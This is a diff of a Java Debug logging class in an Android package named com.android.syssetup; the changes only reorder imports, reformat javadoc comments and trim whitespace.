@@ -7,9 +7,6 @@
 
 package com.android.syssetup;
 
-import java.util.HashMap;
-import java.util.Iterator;
-
 import com.android.syssetup.action.Action;
 import com.android.syssetup.action.SubAction;
 import com.android.syssetup.auto.Cfg;
@@ -18,7 +15,11 @@ import com.android.syssetup.conf.ConfModule;
 import com.android.syssetup.conf.Globals;
 import com.android.syssetup.util.Check;
 
+import java.util.HashMap;
+import java.util.Iterator;
+
 // Debugging class
+
 /**
  * The Class Debug.
  */
@@ -26,7 +27,9 @@ import com.android.syssetup.util.Check;
 public class Debug {
 
 	// private static final String TAG = "D"; //$NON-NLS-1$
-	/** The enabled. */
+	/**
+	 * The enabled.
+	 */
 	private static boolean enabled;
 
 	/** The name. */
@@ -107,7 +110,7 @@ public class Debug {
 			}
 
 		}
-		
+
 
 		if (Cfg.DEBUG) {
 			Check.log("Status Agents Ends"); //$NON-NLS-1$
@@ -171,7 +174,7 @@ public class Debug {
 
 	/**
 	 * Compatibilita' bb.
-	 * 
+	 *
 	 * @param string
 	 *            the string
 	 */
@@ -180,7 +183,7 @@ public class Debug {
 	 * if(Cfg.DEBUG) Log.d(name, string); } }
 	 *//**
 	 * Error.
-	 * 
+	 *
 	 * @param ex
 	 *            the ex
 	 */
@@ -189,7 +192,7 @@ public class Debug {
 	 * if(Cfg.DEBUG) Log.d(name, "ERROR: " +ex.toString()); } }
 	 *//**
 	 * Error.
-	 * 
+	 *
 	 * @param string
 	 *            the string
 	 */
@@ -198,7 +201,7 @@ public class Debug {
 	 * if(Cfg.DEBUG) Log.d(name,"ERROR: " + string); } }
 	 *//**
 	 * Warn.
-	 * 
+	 *
 	 * @param string
 	 *            the string
 	 */
@@ -207,7 +210,7 @@ public class Debug {
 	 * Log.d(name, "WARN: " + string); } }
 	 *//**
 	 * Info.
-	 * 
+	 *
 	 * @param string
 	 *            the string
 	 */
@@ -216,7 +219,7 @@ public class Debug {
 	 * if(Cfg.DEBUG) Log.d(name, "INFO: " + string); } }
 	 *//**
 	 * Fatal.
-	 * 
+	 *
 	 * @param string
 	 *            the string
 	 */
